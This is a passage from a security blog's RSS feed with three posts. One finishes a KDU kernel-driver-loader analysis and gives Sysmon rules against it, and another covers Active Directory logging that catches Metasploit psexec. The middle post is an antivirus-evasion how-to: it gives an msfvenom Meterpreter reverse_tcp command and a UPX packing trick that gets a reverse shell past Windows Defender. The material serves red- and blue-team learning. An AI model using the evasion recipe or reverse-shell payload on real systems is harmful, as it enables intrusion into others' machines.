    &lt;a href=&#34;#dynamic-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now that we have some potential indicators of execution for KDU from the source code: registry writes, files writes and image loads, we’re going to write some tests to see how this works in practice. To test these providers, I compiled KDU from source, wrote a custom kernel mode driver that acts as a tiny example rootkit, and wrote a batch script to execute &lt;strong&gt;&lt;code&gt;kdu -map -prv &amp;lt;ID&amp;gt; rootkit.sys&lt;/code&gt;&lt;/strong&gt; repeatedly with each of the providers in sequence. In each case we analyse the changes made to the system, in this example we’ll be using Procmon, and Sysmon.&lt;/p&gt;
&lt;p&gt;The procmon test shows a pretty clear pattern of events demonstrated by the following diagram:&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/image-1024x409.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;Sysmon output&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Using our custom Sysmon config, we also see the following events traced by Sysmon: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create %TEMP%&lt;strong&gt;PROVIDER&lt;/strong&gt;.sys &lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROVIDER&lt;/strong&gt;Start registry value to 3 (Manual Start)&lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROVIDER&lt;/strong&gt;ImagePath to %TEMP%&lt;strong&gt;PROVIDER&lt;/strong&gt;.sys&lt;/li&gt;
&lt;li&gt;&lt;em&gt;DRIVER LOADED&lt;/em&gt;&lt;strong&gt;&lt;em&gt;: PROVIDER.sys&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Create %CD%&lt;strong&gt;PROCEXP152&lt;/strong&gt;.sys&lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROCEXP152&lt;/strong&gt;Start registry value to 3 (Manual Start)&lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROCEXP152&lt;/strong&gt;ImagePath to %CD%&lt;strong&gt;PROCEXP152&lt;/strong&gt;.sys&lt;/li&gt;
&lt;li&gt;&lt;em&gt;DRIVER LOADED&lt;/em&gt;&lt;strong&gt;&lt;em&gt;: PROCEXP152.sys&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Unsigned Image loaded &lt;strong&gt;rootkit.sys&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This makes more sense if we understand that the registry values in &lt;strong&gt;HKLMSystemCurrentControlSetServices&lt;Driver&gt;&lt;/strong&gt; are set and unset when Windows services are loaded, and these actions aren’t actually performed by the KDU code directly. Instead these events can be read as:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Unpack vulnerable (provider) driver to &lt;code&gt;%CD%&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start it&lt;/li&gt;
&lt;li&gt;Write rootkit binary data to &lt;code&gt;HKLM~&lt;/code&gt; registry hive&lt;/li&gt;
&lt;li&gt;Unpack victim driver (&lt;code&gt;**PROCEXP152**.sys&lt;/code&gt;) to &lt;code&gt;%TEMP%&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start it&lt;/li&gt;
&lt;li&gt;Unsigned rootkit kernel driver loaded into kernel memory&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This is almost exactly the pattern evident from the source code, although we had to add an explicit rule to pick up the binary data in &lt;code&gt;HKLM~&lt;/code&gt;. What we can note here as well is that this entire process relies on the loading of a very particular version of a vulnerable driver - this means it’ll have a particular hash which we could also use as a signature, as well as the final event - an unsigned driver still gets loaded into memory is the biggest telltale sign of something suspicious happening.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now, &lt;a href=&#34;https://www.reddit.com/r/blueteamsec/comments/fychxz/detect_ghostinthelogs_when_executed_disables_all/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;obviously we could have just executed KDU right at the start of this and obtained the IOC’s instantly, but where’s the fun in that&lt;/a&gt;? Instead you should now understand one fairly general technique for elevating from system to kernel, the inner workings of kernel level driver loaders (and the many similar tools using this technique), as well as how we can detect them. &lt;/p&gt;
&lt;p&gt;These detection techniques aren’t particularly sophisticated however, and nothing prevents an adversary from patching or tweaking these variables so KDU writes to different registry hives or disk locations. Or worse yet, making it load the victim and vulnerable drivers from memory instead of dumping them to disk first, in which case we would only see the starting and stopping of the vulnerable and victim driver services. Then simply patching the vulnerable drivers with arbitrary null bytes before loading them would modify the hashes detected by Sysmon. Such is life in cybersecurity… In part 2 we’re going to look at some more sophisticated evasion techniques that rootkits use, and how we can detect those too, so stay tuned!&lt;/p&gt;
&lt;p&gt;The supporting work in this area is my only credit, people like &lt;a href=&#34;https://twitter.com/hFireF0X&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@hfiref0x&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/FuzzySec&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@fuzzysec&lt;/a&gt;, and of course our dude &lt;a href=&#34;https://twitter.com/_batsec_&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@_batsec_&lt;/a&gt; constantly finding ways to break the Windows kernel and invalidate the integrity of our operating systems is one of the many wonders of this world. &lt;/p&gt;
&lt;h2&gt;Appendix&lt;span class=&#34;absolute -mt-20&#34; id=&#34;appendix&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#appendix&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Some sysmon rules for detecting KDU and similar tools (the DriverLoad and ImageLoad events may require you to update your exclusion filters) as the vulnerable drivers that get loaded often appear legitimate and are even signed by Microsoft in the case of &lt;code&gt;**PROCEXP152**.sys&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.23&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;or&amp;#34;&amp;gt;
            &amp;lt;DriverLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;contains&amp;#34; name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34;&amp;gt;TempPROCEXP152.sys&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;Hashes condition=&amp;#34;is&amp;#34; name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34;&amp;gt;C06DDA757B92E79540551EFD00B99D4B&amp;lt;/Hashes&amp;gt;
            &amp;lt;/DriverLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;or&amp;#34;&amp;gt;
            &amp;lt;ImageLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;Signed name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;is&amp;#34;&amp;gt;false&amp;lt;/Signed&amp;gt;
                &amp;lt;ImageLoaded name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;is&amp;#34;&amp;gt;C:WindowsSystem32ntoskrnl.exe&amp;lt;/ImageLoaded&amp;gt;
            &amp;lt;/ImageLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;FileCreate onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;TargetFilename name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;AppDataLocalTempPROCEXP152.sys&amp;lt;/TargetFilename&amp;gt;
            &amp;lt;/FileCreate&amp;gt;
&amp;lt;FileCreate onmatch=&amp;#34;exclude&amp;#34;&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procexp64.exe&amp;lt;/Image&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procexp.exe&amp;lt;/Image&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procmon64.exe&amp;lt;/Image&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procmon.exe&amp;lt;/Image&amp;gt;
            &amp;lt;/FileCreate&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;or&amp;#34;&amp;gt;
            &amp;lt;RegistryEvent onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;PROCEXP152ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;RTCore64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;GdrvImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;ATSZIOImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;MsIo64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;MsIoImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;GLCKIo2ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneIo64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneIoImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;WinRing0x64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;WinRing0_1_2_0ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneTechIo64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneTechIoImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;NalDrvImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;HKLM~&amp;lt;/TargetObject&amp;gt;
            &amp;lt;/RegistryEvent&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;ol&gt;
&lt;li&gt;A basic PowerShell script for incident responders to help perform analysis on target machines. The script simply recurses through the entire &lt;code&gt;HKLM&lt;/code&gt; registry space and checks for any executable data (by checking the PE header magic bytes and length of the entry).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/thomjs/e7c5f6087ff646acf32dae89e9c7ecf2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://gist.github.com/thomjs/e7c5f6087ff646acf32dae89e9c7ecf2&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;References&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hfiref0x/KDU/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/hfiref0x/KDU/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://swapcontext.blogspot.com/2020/01/unwinding-rtcore.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://swapcontext.blogspot.com/2020/01/unwinding-rtcore.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://eclypsium.com/wp-content/uploads/sites/2/2019/08/EXTERNAL-Get-off-the-kernel-if-you-cant-drive-DEFCON27.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://eclypsium.com/wp-content/uploads/sites/2/2019/08/EXTERNAL-Get-off-the-kernel-if-you-cant-drive-DEFCON27.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.fuzzysecurity.com/tutorials/expDev/23.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.fuzzysecurity.com/tutorials/expDev/23.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

      </description>
    </item>
    
    <item>
      <title>Bypassing Antivirus with Golang - Gopher it!</title>
      <link>//localhost:1313/articles/2019/06/2019-06-20-bypassing-antivirus-with-golang-gopher-it/</link>
      <pubDate>Thu, 20 Jun 2019 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2019/06/2019-06-20-bypassing-antivirus-with-golang-gopher-it/</guid>
      <description>
        
        
        &lt;p&gt;In this blog post, we’re going to detail a cool little trick we came across on how to bypass most antivirus products to get a Metepreter reverse shell on a target host. This all started when we came across &lt;a href=&#34;https://github.com/brimstone/go-shellcode&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;a Github repository written in Golang&lt;/a&gt;, which on execution could inject shellcode into running processes. By simply generating a payload with msfvenom we tested it and found that it was easily detected by Windows Defender. The Meterpreter payload was generated as follows:&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx -b \x00 -f hex&lt;/p&gt;
&lt;p&gt;The perk of using Go for this experiment is that it can be cross-compiled, from a Linux host for a target Windows host. The command to compile the application was:&lt;/p&gt;
&lt;p&gt;GOOS=windows GOARCH=amd64 go build&lt;/p&gt;
&lt;p&gt;This would produce a Go exe which would be executed from the command line, along with the shellcode the attacker wanted to inject. This was easily detected, and Windows Defender identified it as Meterpreter without any trouble. As a quick and easy bypass, we tried to compress the executable using UPX in brute mode, which repeatedly compresses it 8 times. No luck here either, as Windows Defender caught it again.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.1- Attempting to run the Go exe file with the shellcode as an argument. As you can see it was easily detected by Windows Defender. We then tried with the UPX compressed sc.exe file, which also didn’t work.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig2.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.2 - Of course, the Meterpreter session is killed as soon as the process is detected by Windows Defender.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;From here we inspected the source code of the Go program. After some review, we discovered that the main.go source file could be modified to take the shellcode as a variable then compiled – instead of compiling the .exe then adding the shellcode as a command line argument.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig3.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.3 - The go-shellcode/cmd/sc/main.go source.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig4.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.4 - The modified go-shellcode/cmd/sc/main.go source, where the reference to a command line argument is substituted for a declared variable.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;With these we compiled two .exe files, one to be tested without UPX compression, and one with UPX compression. Windows Defender detects the non-compressed version as soon as it touches disk, but does not detect the UPX compressed .exe with static analysis.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig5.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.5 - The .exe with no UPX compression is instantly detected as containing a Meterpreter payload by Windows Defender. No dice.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Running the custom UPX compressed .exe file is successful however, and a reverse shell is achieved!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig6.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.6 - Running the UPX compressed Go exe file is successful, and a reverse shell is achieved on the victim’s machine.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Fantastic. Let’s run it against VT to check how loud the signature for this is.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.7 - Uploading the UPX compressed Go exe file to Virus Total. Only Cybereason and Cylance detect the file as being malicious.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Only two antivirus engines are picking up that there is a malicious payload in this file, and both of them don’t specify what exactly about the upload is malicious, just that it IS malicious. The UPX compression is likely what’s triggering the alert, as UPX compression can be used to obfuscate malicious files.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig8.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.8 - UPX compression in brute mode compresses the exe file 8 times.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;And that’s it! In this blog post we detailed how we modified a great Go program from Github (resource listed below) that performed shellcode injection into one that efficiently evaded most antivirus programs.&lt;/p&gt;
&lt;p&gt;The gist for this is available &lt;a href=&#34;https://gist.github.com/JumpsecLabs/202f95f9cce1ff35f140a37de0e62f30&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Reference:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/brimstone/go-shellcode&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/brimstone/go-shellcode&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://boyter.org/posts/trimming-golang-binary-fat/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://boyter.org/posts/trimming-golang-binary-fat/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.filippo.io/shrink-your-go-binaries-with-this-one-weird-trick/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.filippo.io/shrink-your-go-binaries-with-this-one-weird-trick/&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Enhanced logging to detect common attacks on Active Directory– Part 1</title>
      <link>//localhost:1313/articles/2019/02/2019-02-06-enhanced-logging-to-detect-common-attacks-on-active-directory-part-1/</link>
      <pubDate>Wed, 06 Feb 2019 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2019/02/2019-02-06-enhanced-logging-to-detect-common-attacks-on-active-directory-part-1/</guid>
      <description>
        
        
        &lt;p&gt;In this blog post I am going to tackle the topic of detecting common attacks using Active Directory logs. It is important to understand the power of data in InfoSec world. Too much data means you’ll be spending rest of the week digging through millions of log entries to try and figure out what the adversary was up to. You can set filters to help you through this, however it can get computationally expensive very fast depending on how your filters operate. It also requires you to know what to specifically look out for! You need to have confidence in your filters and test them thoroughly from time to time to make sure they actually work.&lt;/p&gt;
&lt;p&gt;On the other hand, too little data means you might not have enough log entries to investigate and provide full evidence of what malicious techniques were attempted. For this reason, it is a constant battle of finding the middle ground of having hard evidence and not overwhelming your SIEM. Another golden question to ask is: are we even logging the correct events?&lt;/p&gt;
&lt;p&gt;One of the ways to get around this problem is configuring the correct Group Policies on the Domain Controllers. In this blog post I want to focus solely on command line logging because it is a quick win and it shows immense amount of detail into what processes and commands are executed. We start off by enabling the correct settings in the Group Policy using Group Policy Editor. The steps are detailed below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Follow the path &lt;strong&gt;&lt;em&gt;Policies → Administrative Templates → System → Audit Process Creation. And enable “include command line in process creation events”&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Follow the path &lt;strong&gt;&lt;em&gt;Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → System Audit Policies → Detailed Tracking&lt;/em&gt;&lt;/strong&gt;. And enable both &lt;strong&gt;&lt;em&gt;Successful&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;Failure&lt;/em&gt;&lt;/strong&gt; configuration for “&lt;strong&gt;&lt;em&gt;Audit Process Creation&lt;/em&gt;&lt;/strong&gt;” and “&lt;em&gt;&lt;strong&gt;Audit Process Termination&lt;/strong&gt;&lt;/em&gt;” as shown below.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/2.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/3.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;After configuring these settings, run the good old group policy update on command prompt as administrator using the command &lt;strong&gt;&lt;em&gt;gpupdate /force&lt;/em&gt;&lt;/strong&gt;. At this point, you should be able to see all commands being executed via command prompt.&lt;/p&gt;
&lt;p&gt;We can test this by running some commands and viewing the logs to verify as shown below by running some test commands. We can see that by running test commands &lt;strong&gt;event ID 4688&lt;/strong&gt; (New process created) event is generated showing what was typed in the command prompt.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/4.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/5-3.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;img src=&#34;images/6-2.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now, we can move forward and test this with the psexec module from Metasploit using the &lt;em&gt;exploit/windows/smb/psexec&lt;/em&gt; module as shown below.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;After setting the correct parameters, we execute the exploit and observe the logs produced from this action.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/8.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now this will generate a lot of events and keeping up with the incoming logs using Windows Event Viewer will be almost impossible. The best way to analyse these events is to parse these events through a SIEM solution for better log management. After everything is set up correctly, we can now begin the hunt! Monitoring the recent activity on the target machine, we see some interesting events:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Event ID 7045&lt;/strong&gt; – A service was installed in the system&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/9.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The details around this event shows that the service named &lt;strong&gt;&lt;em&gt;yReAMNiNjOyqeWQI&lt;/em&gt;&lt;/strong&gt; was installed by the user root (which we know is the user used for this exploit). There are some interesting parameters defined here such as &lt;strong&gt;-nop&lt;/strong&gt;, &lt;strong&gt;-hidden&lt;/strong&gt; and &lt;strong&gt;-noni&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Such parameters can be used for obfuscation purposes. However, it becomes harder to detect these obfuscation parameters with keyword matching when there are multiple valid execution argument aliases for them. For example, for &lt;strong&gt;-NoProfile&lt;/strong&gt; argument alone, argument substrings such as &lt;strong&gt;-NoP&lt;/strong&gt;, &lt;strong&gt;-NoPr&lt;/strong&gt; &lt;strong&gt;-NoPro&lt;/strong&gt;, &lt;strong&gt;-NoProf&lt;/strong&gt;, &lt;strong&gt;-NoProfi&lt;/strong&gt; and &lt;strong&gt;-NoProfil&lt;/strong&gt; are all valid! This is where we chuck keyword matching filters out of the window and look towards regular expressions for detection.&lt;/p&gt;
&lt;p&gt;Focusing more on the name of the service being installed (&lt;em&gt;&lt;strong&gt;yReAMNiNjOyqeWQI&lt;/strong&gt;&lt;/em&gt;) looks like gibberish which is exactly what it is. Looking at the source code of the psexec module for Metasploit framework, we see that the display name is essentially 16 character long random text! We just found another possible filter that could help us detect these types of exploits.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/10.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Furthermore, we can also see a new process created (with &lt;strong&gt;event ID 4688&lt;/strong&gt;) which logs the actual command being executed during this attack!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/11.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Do you remember the thing we did with the group policies earlier? It wasn’t just to fill this blog post with random text and screenshots…nope… instead setting those group policies accordingly will allow you to log what was executed in command prompt as shown above! This is very useful in monitoring what crazy things are being executed on your windows network.&lt;/p&gt;
&lt;p&gt;That’s all for now, I hope you found this helpful as well as interesting. In the next part of this blog post series I will reveal more ingesting detection techniques.&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
